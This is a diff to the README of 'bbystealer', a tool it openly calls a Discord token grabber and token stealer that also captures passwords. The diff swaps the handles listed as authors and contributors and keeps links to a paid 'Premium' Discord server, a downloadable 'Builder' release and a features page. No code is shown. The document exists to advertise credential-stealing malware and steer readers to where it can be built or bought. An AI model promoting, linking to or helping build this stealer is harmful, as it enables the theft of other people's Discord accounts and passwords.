@@ -3,12 +3,12 @@
 #####  [:gem: Premium](https://discord.gg/RBnK3ny) - [🔧 Builder](https://github.com/pereslusiano/bbystealer/releases/tag/builder) - [💡 Features](https://github.com/pereslusiano/bbystealer) 
 
 ### Authors
-- stanley#0511
-- Emmie#2046
+- kwayse#7777
+- Syborg#3842
 
 ### Contributors
-- east#1889
-- Jarell#0468
+- kwayse#7777
+- Syborg#3842
 
 # bbystealer
 The new modern discord token grabber & token stealer, with discord password & token even when it changes
